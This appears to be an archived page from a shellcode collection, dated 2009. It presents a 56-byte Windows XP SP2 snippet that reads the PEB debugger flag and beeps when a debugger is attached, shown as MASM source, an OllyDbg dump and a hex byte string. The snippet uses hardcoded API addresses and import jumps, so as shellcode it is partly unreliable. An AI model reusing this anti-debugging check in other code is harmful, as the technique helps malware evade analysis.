<html><head><title>Windows - xp sp2 PEB ISbeingdebugged shellcode - 56 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#name: win xp sp2 PEB ISbeingdebugged shellcode
#Author: Anonymous
#Date: 14.12.2009.
here is the ASM code made using masm32
if program is being run under debugger the shellcode wil start beeping :D
//////////////////////begin///////////////////////////////////////
.386
.model flat, stdcall
option casemap :none
INCLUDE  C:\MASM32\INCLUDE\WINDOWS.INC
INCLUDE  C:\MASM32\INCLUDE\KERNEL32.INC
INCLUDE  C:\MASM32\INCLUDE\USER32.INC
INCLUDE  C:\MASM32\INCLUDE\MASM32.INC
INCLUDELIB  C:\MASM32\LIB\KERNEL32.LIB
INCLUDELIB  C:\MASM32\LIB\USER32.LIB
INCLUDELIB  C:\MASM32\LIB\MASM32.LIB
    .data
ExitMsg  DB &quot;Enter to Exit&quot;, 0
  .code
 start:
assume fs:nothing
mov eax,fs:[30h]
mov     eax, [eax+02h]
mov ebx, 7FFF8000h
add ebx,7FFF8000h
inc ebx
push 300h
push 200h
mov edx,7c837a8fh
cmp eax,ebx
jnz exit
call edx
exit:
invoke ExitProcess,NULL
end start
/////////////////////////////end///////////////////////////////
here is the dump of code using olly debugger
00401000 &gt;/$ 64:A1 30000000 MOV EAX,DWORD PTR FS:[30]
00401006  |. 8B40 02        MOV EAX,DWORD PTR DS:[EAX+2]
00401009  |. BB 0080FF7F    MOV EBX,7FFF8000
0040100E  |. 81C3 0080FF7F  ADD EBX,7FFF8000
00401014  |. 43             INC EBX
00401015  |. 68 00030000    PUSH 300                                 ; /Duration = 768. ms
0040101A  |. 68 00020000    PUSH 200                                 ; |Frequency = 200 (512.)
0040101F  |. BA 8F7A837C    MOV EDX,kernel32.Beep                    ; |
00401024  |. 3BC3           CMP EAX,EBX                              ; |
00401026  |. 75 02          JNZ SHORT antidebu.0040102A              ; |
00401028  |. FFD2           CALL EDX                                 ; \Beep
0040102A  |&gt; 6A 00          PUSH 0                                   ; /ExitCode = 0
0040102C  \. E8 01000000    CALL &lt;JMP.&amp;kernel32.ExitProcess&gt;         ; \ExitProcess
00401031     CC             INT3
00401032   .-FF25 00204000  JMP DWORD PTR DS:[&lt;&amp;kernel32.ExitProcess&gt;;  kernel32.ExitProcess
here is the shellcode
\x64\xA1\x30\x00\x00\x00\x8B\x40\x02\xBB\x00\x80\xFF\x7F\x81\xC3\x00\x80\xFF\x7F\x43\x68\x00\x03\x00\x00\x68\x00\x02\x00\x00\xBA\x8F\x7A\x83\x7C\x3B\xC3\x75\x02\xFF\xD2\x6A\x00\xE8\x01\x00\x00\x00\xCC\xFF\x25\x00\x20\x40\x00

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
